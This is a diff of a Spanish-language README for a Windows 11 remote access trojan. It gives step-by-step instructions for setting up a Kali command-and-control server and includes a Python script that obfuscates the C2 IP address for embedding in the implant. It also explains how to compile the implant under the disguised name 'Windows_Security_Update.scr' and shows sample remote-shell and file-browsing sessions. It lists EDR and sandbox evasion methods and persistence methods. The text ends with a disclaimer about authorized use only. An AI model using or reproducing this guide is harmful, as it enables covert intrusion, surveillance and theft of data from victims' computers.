@@ -1,4 +1,3 @@
-markdown
 # 🕵️‍♂️ Advanced Windows 11 RAT - Documentación Completa
 
 ## 📖 ÍNDICE
@@ -19,7 +18,7 @@ markdown
 
 ### ⚡ ¿Qué hace este RAT?
 - ✅ **Control remoto completo** de sistemas Windows 11
-- ✅ **Evación avanzada** de defensas nativas de Windows
+- ✅ **Evasión avanzada** de defensas nativas de Windows
 - ✅ **Comunicación cifrada** con servidor C2
 - ✅ **Persistencia múltiple** en el sistema objetivo
 - ✅ **Recolección de inteligencia** automatizada
@@ -48,7 +47,6 @@ markdown
 ## ⚙️ REQUISITOS DEL SISTEMA
 
 ### 🐧 Servidor C2 (Kali Linux)
-```bash
 # Sistema Operativo
 - Kali Linux 2023+ o distribución Linux similar
 - Python 3.8+
@@ -58,7 +56,7 @@ markdown
 python3 -c "import sys; assert sys.version_info >= (3, 8)"
 pip3 install cryptography
 🪟 Cliente RAT (Windows)
-bash
+
 # Sistema Operativo
 - Windows 11 (todas versiones)
 - Visual Studio 2022 Build Tools
@@ -69,9 +67,9 @@ bash
 - crypt32.lib (CryptoAPI)
 - ntdll.lib (Syscalls nativos)
 - bcrypt.lib (Cifrado avanzado)
+
 🚀 INSTALACIÓN Y CONFIGURACIÓN
 Paso 1: Configurar Servidor C2 (Kali)
-bash
 # 1. Actualizar sistema e instalar dependencias
 sudo apt update && sudo apt upgrade -y
 sudo apt install python3-pip git -y
@@ -79,18 +77,46 @@ sudo apt install python3-pip git -y
 # 2. Instalar librerías de criptografía
 pip3 install cryptography
 
-# 3. Clonar y configurar el proyecto
-git clone https://github.com/tu-repo/advanced-win11-rat.git
-cd advanced-win11-rat
+# 3. Crear archivo del servidor C2
+nano c2_server.py
+# Pegar el código Python del servidor C2 proporcionado
 
-# 4. Configurar IP del servidor (EDITAR ANTES DE USAR)
-nano config.py
-# Modificar: C2_IP = "192.168.1.100"  # Tu IP de Kali
+# 4. MODIFICAR LA IP EN EL CÓDIGO C++ ANTES DE COMPILAR
+# Editar troyano_w11.cpp línea ~40 y reemplazar:
+# std::vector<BYTE> encrypted_c2_ip = {tus_bytes_ofuscados}; // "TU_IP_KALI"
 
 # 5. Ejecutar servidor C2
 sudo python3 c2_server.py
-Paso 2: Compilar el RAT (Windows)
-bash
+Paso 2: Configurar IP del C2
+
+⚠️ IMPORTANTE: Modificar antes de compilar
+
+Obtener IP de Kali:
+
+hostname -I
+# o
+ip addr show
+Crear script para ofuscar IP:
+
+# ofuscador_ip.py
+def ofuscar_ip(ip):
+    key = [((i * 7 + 13) % 256) for i in range(32)]
+    ofuscada = []
+    for i, char in enumerate(ip):
+        byte = ord(char)
+        byte = ((byte << ((i % 7) + 1)) & 0xFF) | (byte >> (8 - ((i % 7) + 1)))
+        byte ^= key[i % len(key)]
+        ofuscada.append(byte)
+    return ofuscada
+
+ip_kali = "192.168.1.100"  # CAMBIAR POR TU IP
+bytes_ofuscados = ofuscar_ip(ip_kali)
+print(f'std::vector<BYTE> encrypted_c2_ip = {{{", ".join(f"0x{b:02X}" for b in bytes_ofuscados)}}};')
+Ejecutar y reemplazar en código C++:
+
+python3 ofuscador_ip.py
+# Copiar salida y reemplazar en troyano_w11.cpp línea ~40
+Paso 3: Compilar el RAT (Windows)
 # 1. Abrir Developer Command Prompt de VS 2022
 # Buscar en inicio: "Developer Command Prompt"
 
@@ -102,17 +128,17 @@ cl.exe /Fe:"Windows_Security_Update.scr" /std:c++latest /O2 /GL /Gy /GS- /GR- /E
 
 # 4. Verificar compilación exitosa
 dir Windows_Security_Update.scr
-Paso 3: Configurar Red y Puertos
-bash
+Paso 4: Configurar Red y Puertos
+
 # En el router/firewall, permitir:
 - Puerto TCP 443 (HTTPS) entrante en Kali
 - IP estática para el servidor Kali
 
 # Verificar conectividad desde Windows:
 telnet 192.168.1.100 443  # Reemplazar con IP de Kali
-🎮 USO DEL SISTEMA
+
+USO DEL SISTEMA
 Iniciar Sesión C2
-bash
 # En Kali Linux:
 sudo python3 c2_server.py
 
@@ -129,7 +155,7 @@ PWD	Directorio actual de trabajo	PWD
 IDLE	Comando de verificación	IDLE
 Ejemplos de Uso
 1. Obtener Información del Sistema
-bash
+
 [💻 C2@192.168.1.50]> INFO
 
 [📨 RESPONSE]:
@@ -140,7 +166,7 @@ Computer: DESKTOP-ABC123
 User: john.doe
 RAM: 16 GB
 2. Ejecutar Comandos Remotos
-bash
+
 [💻 C2@192.168.1.50]> SHELL
 
 [📨 RESPONSE]:
@@ -154,7 +180,6 @@ Adaptador de Ethernet Ethernet0:
    Dirección IPv4. . . . . . . . . . . . . . : 192.168.1.50
    Máscara de subred . . . . . . . . . . . . : 255.255.255.0
 3. Explorar Sistema de Archivos
-bash
 [💻 C2@192.168.1.50]> FILES
 
 [📨 RESPONSE]:
@@ -166,7 +191,6 @@ bash
 [DIR] Confidential
 🔧 FUNCIONALIDADES DETALLADAS
 🛡️ Módulo de Evasión Avanzada
-cpp
 // Técnicas implementadas:
 - Memory Mapping Indirecto (bypass HVCI)
 - Timing Attacks anti-sandbox
@@ -174,20 +198,17 @@ cpp
 - Simulación de comportamiento legítimo
 - Syscalls directos (bypass EDR hooks)
 🔐 Sistema de Cifrado
-python
 # Algoritmo compatible cliente-servidor
 def encrypt_data(data):
     # ROTL + XOR con clave dinámica
     # Compatible total con implementación C++
 📡 Comunicaciones Sigilosas
-cpp
 // Características de red:
 - Puerto 443 (tráfico HTTPS legítimo)
 - Backoff exponencial en reconexión
 - Ofuscación de patrones de tráfico
 - Timeouts variables anti-detección
 💾 Mecanismos de Persistencia
-cpp
 // Múltiples métodos implementados:
 - Registry Run Keys (HKCU\...\Run)
 - Scheduled Tasks (Tareas programadas)
@@ -195,7 +216,6 @@ cpp
 - WMI Event Subscriptions
 ⚠️ CONSIDERACIONES DE SEGURIDAD
 🎯 USO ÉTICO AUTORIZADO
-text
 ✅ PERMITIDO EN:
 - Pruebas de penetración con consentimiento
 - Laboratorios de seguridad educativos
@@ -208,14 +228,12 @@ text
 - Robo de información o datos
 - Daño a sistemas o redes
 🔒 MEDIDAS DE SEGURIDAD IMPLEMENTADAS
-bash
 # En el código:
 - Verificación de entorno (anti-sandbox)
 - Detección de herramientas de análisis
 - Comprobación de recursos del sistema
 - Múltiples capas de ofuscación
 📝 COMPLIANCE LEGAL
-text
 ⚠️ ADVERTENCIA LEGAL:
 El uso de esta herramienta sin autorización explícita
 constituye un delito en la mayoría de jurisdicciones.
